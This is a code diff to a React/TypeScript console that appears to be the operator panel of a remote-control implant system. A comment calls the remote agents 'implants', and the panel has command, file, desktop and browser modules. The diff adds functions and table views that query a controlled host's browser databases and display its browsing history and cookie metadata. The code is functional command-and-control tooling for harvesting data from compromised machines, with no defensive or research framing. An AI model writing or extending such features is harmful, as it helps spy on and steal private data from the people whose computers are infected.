@@ -29,7 +29,7 @@ import styles from './console.module.css'
 
 type Mod = 'cmd' | 'files' | 'desk' | 'browser'
 type FsItem = { key: string; kind: 'dir' | 'file'; name: string; size: number; mtime?: number }
-type BrowserRow = { key: string; kind: string; browser: string; a: string; b: string; c: string; size: number }
+type BrowserRow = { key: string; kind: string; browser: string; a: string; b: string; c: string; size: number; path: string }
 type BrowserSnap = { at: number; rows: string[] }
 type Shot = { id: string; url: string; w: number; h: number; at: number }
 type StashItem = { id: string; name: string; remote: string; size: number; at: number }
@@ -114,13 +114,19 @@ function crumbs(p: string) {
   return out
 }
 
+const BROWSER_KINDS = new Set(['F', 'V', 'B', 'E'])
+
 function parseBrowser(output: string): BrowserRow[] {
   return output
     .split('\n')
     .filter(Boolean)
     .map((line, i) => {
       const p = line.split('\t')
-      return { key: `${i}-${p[3] || ''}`, kind: p[0] || '', browser: p[1] || '', a: p[2] || '', b: p[3] || '', c: p[4] || '', size: Number(p[5] || 0) }
+      // 旧植入端只回 5 列（browser/profile/name/size/mtime），退化成文件行
+      if (!BROWSER_KINDS.has(p[0])) {
+        return { key: `${i}`, kind: 'F', browser: p[0] || '', a: p[1] || '', b: p[2] || '', c: p[4] || '', size: Number(p[3] || 0), path: '' }
+      }
+      return { key: `${i}-${p[3] || ''}`, kind: p[0], browser: p[1] || '', a: p[2] || '', b: p[3] || '', c: p[4] || '', size: Number(p[5] || 0), path: p[6] || '' }
     })
 }
 
@@ -330,6 +336,10 @@ export default function Host() {
   const [browserQ, setBrowserQ] = useState('')
   const [browserSnaps, setBrowserSnaps] = useState<BrowserSnap[]>([])
   const [browserSnapAt, setBrowserSnapAt] = useState(0)
+  const [dbKind, setDbKind] = useState<'' | 'history' | 'cookies'>('')
+  const [dbCols, setDbCols] = useState<string[]>([])
+  const [dbRows, setDbRows] = useState<string[][]>([])
+  const [dbBusy, setDbBusy] = useState(false)
 
   const scanBrowser = useCallback(async () => {
     if (!id) return
@@ -354,6 +364,28 @@ export default function Host() {
       setBrowserBusy(false)
     }
   }, [id, info?.hostname, message])
+
+  const loadStore = useCallback(
+    async (path: string, kind: 'history' | 'cookies') => {
+      if (!id || !path) return
+      setDbBusy(true)
+      try {
+        const r = (await api(`/api/sessions/${id}/browser/query`, { method: 'POST', body: JSON.stringify({ path, kind }) })) as {
+          columns: string[]
+          rows: string[][]
+        }
+        setDbKind(kind)
+        setDbCols(r.columns || [])
+        setDbRows(r.rows || [])
+        message.success(`${kind === 'history' ? '浏览历史' : 'Cookie 元数据'}：${(r.rows || []).length} 条`)
+      } catch (e) {
+        message.error((e as Error).message)
+      } finally {
+        setDbBusy(false)
+      }
+    },
+    [id, message],
+  )
 
   const showSnapshot = useCallback((at: number) => {
     setBrowserSnapAt(at)
@@ -1021,7 +1053,8 @@ export default function Host() {
             <Table
               size="small"
               rowKey="key"
-              pagination={false}
+              loading={dbBusy}
+              pagination={{ pageSize: 50, size: 'small', hideOnSinglePage: true }}
               dataSource={fileRows}
               locale={{ emptyText: online ? '点击扫描' : '主机离线' }}
               columns={[
@@ -1030,6 +1063,20 @@ export default function Host() {
                 { title: '项目', dataIndex: 'b', ellipsis: true },
                 { title: '大小', dataIndex: 'size', width: 100, render: (v: number) => (v ? fmtSize(v) : '—') },
                 { title: '最后修改', dataIndex: 'c', width: 170, render: (v: string) => fmtTime(Number(v)) },
+                {
+                  title: '操作',
+                  width: 130,
+                  render: (_: unknown, r: BrowserRow) =>
+                    r.b === 'History' ? (
+                      <Button type="link" size="small" disabled={!r.path || dbBusy} onClick={() => void loadStore(r.path, 'history')}>
+                        浏览历史
+                      </Button>
+                    ) : r.b === 'Cookies' ? (
+                      <Button type="link" size="small" disabled={!r.path || dbBusy} onClick={() => void loadStore(r.path, 'cookies')}>
+                        Cookie 元数据
+                      </Button>
+                    ) : null,
+                },
               ]}
             />
             <div className={styles.browserSection}>书签</div>
@@ -1060,6 +1107,32 @@ export default function Host() {
                 { title: '版本', dataIndex: 'c', width: 120 },
               ]}
             />
+            {dbKind ? (
+              <>
+                <div className={styles.browserSection}>
+                  {dbKind === 'history' ? '浏览历史' : 'Cookie 元数据（主机 / 名称 / 过期时间，不含值）'}
+                  <Button
+                    type="link"
+                    size="small"
+                    onClick={() => {
+                      setDbKind('')
+                      setDbCols([])
+                      setDbRows([])
+                    }}
+                  >
+                    关闭
+                  </Button>
+                </div>
+                <Table
+                  size="small"
+                  rowKey="key"
+                  loading={dbBusy}
+                  pagination={{ pageSize: 50, size: 'small', hideOnSinglePage: true }}
+                  dataSource={dbRows.map((r, i) => ({ key: `${i}`, cells: r }))}
+                  columns={dbCols.map((col, ci) => ({ title: col, dataIndex: ['cells', ci], ellipsis: true }))}
+                />
+              </>
+            ) : null}
           </div>
         </div>
         <div className={styles.fill} hidden={mod !== 'desk'}>
